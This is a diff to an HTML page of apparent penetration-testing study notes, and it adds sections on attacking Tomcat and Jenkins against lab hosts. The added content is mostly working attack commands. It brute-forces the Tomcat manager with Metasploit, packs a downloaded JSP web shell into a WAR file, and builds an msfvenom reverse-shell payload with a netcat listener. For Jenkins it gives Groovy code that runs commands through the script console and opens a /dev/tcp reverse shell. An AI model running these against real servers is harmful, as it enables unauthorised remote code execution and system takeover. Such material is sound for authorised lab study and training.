@@ -1131,6 +1131,96 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#enumeration_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-tomcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Tomcat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Tomcat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tomcat-manager-login-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tomcat Manager - Login Brute Force
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tomcat-manager-war-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tomcat Manager - WAR File Upload
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Jenkins
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Jenkins">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery &amp; Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-jenkins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Jenkins
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Jenkins">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#script-console" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script Console
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1611,6 +1701,96 @@
       Discovery/Footprinting
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enumeration_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-tomcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Tomcat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Tomcat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#tomcat-manager-login-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tomcat Manager - Login Brute Force
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tomcat-manager-war-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      Tomcat Manager - WAR File Upload
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jenkins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Jenkins
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Jenkins">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#discovery-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Discovery &amp; Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attacking-jenkins" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attacking Jenkins
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attacking Jenkins">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#script-console" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script Console
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -2199,7 +2379,7 @@ Create a .htaccess file to give ourselves access to the folder
 </span><span id="__span-39-13">    └── classes                     # Classes might contain important business logic as well as sensitive information
 </span><span id="__span-39-14">        └── AdminServlet.class   
 </span></code></pre></div></td></tr></table></div></li>
-<li>Example web.xml file:
+<li>Example web.xml file (important to check to leverage LFI):
 <div class="language-xml highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">XML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
@@ -2230,7 +2410,109 @@ Create a .htaccess file to give ourselves access to the folder
 </span><span id="__span-40-14"><span class="w">  </span><span class="nt">&lt;/servlet-mapping&gt;</span>
 </span><span id="__span-40-15"><span class="nt">&lt;/web-app&gt;</span><span class="w"> </span>
 </span></code></pre></div></td></tr></table></div></li>
+<li><code>tomcat-users.xml</code> has valuable user information</li>
 </ul>
+<h3 id="enumeration_2">Enumeration</h3>
+<ul>
+<li>Attempt to locate the /manager and /host-manager pages:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-41-1">gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://web01.inlanefreight.local:8180/<span class="w"> </span>-w<span class="w"> </span>/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Try to log in with weak creds (tomcat:tomcat, admin:admin) or bruteforce</li>
+</ul>
+<h3 id="attacking-tomcat">Attacking Tomcat</h3>
+<h4 id="tomcat-manager-login-brute-force">Tomcat Manager - Login Brute Force</h4>
+<ul>
+<li>Try bruteforcing the Tomcat manager page using Metasploit:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-42-1">msfconsole
+</span><span id="__span-42-2">use<span class="w"> </span>auxiliary/scanner/http/tomcat_mgr_login
+</span><span id="__span-42-3"><span class="nb">set</span><span class="w"> </span>VHOST<span class="w"> </span>web01.inlanefreight.local
+</span><span id="__span-42-4"><span class="nb">set</span><span class="w"> </span>RPORT<span class="w"> </span><span class="m">8180</span>
+</span><span id="__span-42-5"><span class="nb">set</span><span class="w"> </span>stop_on_success<span class="w"> </span><span class="nb">true</span>
+</span><span id="__span-42-6"><span class="nb">set</span><span class="w"> </span>rhosts<span class="w"> </span><span class="m">10</span>.129.128.204<span class="w"> </span>
+</span><span id="__span-42-7">show<span class="w"> </span>options<span class="w"> </span>
+</span><span id="__span-42-8">run
+</span></code></pre></div></td></tr></table></div></li>
+</ul>
+<h4 id="tomcat-manager-war-file-upload">Tomcat Manager - WAR File Upload</h4>
+<ul>
+<li>Available at /manager/html by default</li>
+<li>Users assigned the manager-gui role are allowed to access</li>
+<li>Login to manager page (<code>http://web01.inlanefreight.local:8180/manager/html</code>) once valid credentials obtained</li>
+<li>Download JSP web shell and zip it as a .war file
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-43-1">wget<span class="w"> </span>https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+</span><span id="__span-43-2">zip<span class="w"> </span>-r<span class="w"> </span>backup.war<span class="w"> </span>cmd.jsp<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>In the GUI click on <code>Browse</code> to select the .war file and then click on <code>Deploy</code></li>
+<li>Once uploaded the <code>/backup</code> application should appear in the applications table</li>
+<li>Confirm webshell execution <code>curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id</code></li>
+<li>
+<p>Undeploy backups application once done</p>
+</li>
+<li>
+<p>Can also create a reverse shell using msfvenom
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-44-1">msfvenom<span class="w"> </span>-p<span class="w"> </span>java/jsp_shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.251<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span><span class="w"> </span>-f<span class="w"> </span>war<span class="w"> </span>&gt;<span class="w"> </span>backup.war
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+<li>Start a Netcat listener and click on /backup to execute the shell.
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-45-1">nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">4443</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Metaploit module <code>multi/http/tomcat_mgr_upload</code> can automate this process</li>
+</ul>
+<h2 id="jenkins"><a href="https://www.jenkins.io/">Jenkins</a></h2>
+<h3 id="discovery-enumeration">Discovery &amp; Enumeration</h3>
+<ul>
+<li>0pen-source automation server written in Java that helps developers build and test their software projects continuously</li>
+<li>Default runs on port 8080 with slaves on 5000</li>
+<li>Default login page reveals we are dealing with Jenkins</li>
+<li>Default credentials admin:admin</li>
+</ul>
+<h3 id="attacking-jenkins">Attacking Jenkins</h3>
+<h4 id="script-console">Script Console</h4>
+<ul>
+<li>Run arbitrary Groovy scripts within the Jenkins controller runtime</li>
+<li>Found at <code>http://jenkins.inlanefreight.local:8000/script</code></li>
+</ul>
+<p><strong>Linux Hosts</strong>
+- Example groovy script:
+<div class="language-groovy highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Groovy</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-46-1"><span class="kt">def</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;id&#39;</span>
+</span><span id="__span-46-2"><span class="kt">def</span><span class="w"> </span><span class="n">sout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuffer</span><span class="o">(),</span><span class="w"> </span><span class="n">serr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringBuffer</span><span class="o">()</span>
+</span><span id="__span-46-3"><span class="kt">def</span><span class="w"> </span><span class="n">proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="o">.</span><span class="na">execute</span><span class="o">()</span>
+</span><span id="__span-46-4"><span class="n">proc</span><span class="o">.</span><span class="na">consumeProcessOutput</span><span class="o">(</span><span class="n">sout</span><span class="o">,</span><span class="w"> </span><span class="n">serr</span><span class="o">)</span>
+</span><span id="__span-46-5"><span class="n">proc</span><span class="o">.</span><span class="na">waitForOrKill</span><span class="o">(</span><span class="mi">1000</span><span class="o">)</span>
+</span><span id="__span-46-6"><span class="n">println</span><span class="w"> </span><span class="n">sout</span>
+</span></code></pre></div></td></tr></table></div>
+- Reverse shell script
+<div class="language-groovy highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Groovy</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-47-1"><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
+</span><span id="__span-47-2"><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">,</span><span class="s2">&quot;-c&quot;</span><span class="o">,</span><span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">String</span><span class="o">[])</span>
+</span><span id="__span-47-3"><span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
+</span></code></pre></div></td></tr></table></div>
+- Can use metasploit to get reverse shell:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-48-1">use<span class="w"> </span>exploit/multi/http/jenkins_script_console
+</span><span id="__span-48-2"><span class="nb">set</span><span class="w"> </span>TARGET<span class="w"> </span>&lt;<span class="w"> </span>target-id<span class="w"> </span>&gt;
+</span><span id="__span-48-3">exploit
+</span></code></pre></div></td></tr></table></div>
+- Start listener and upgrade to interactive shell:
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-49-1">nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8443</span>
+</span><span id="__span-49-2">/bin/bash<span class="w"> </span>-i
+</span></code></pre></div></td></tr></table></div></p>
 
 
 
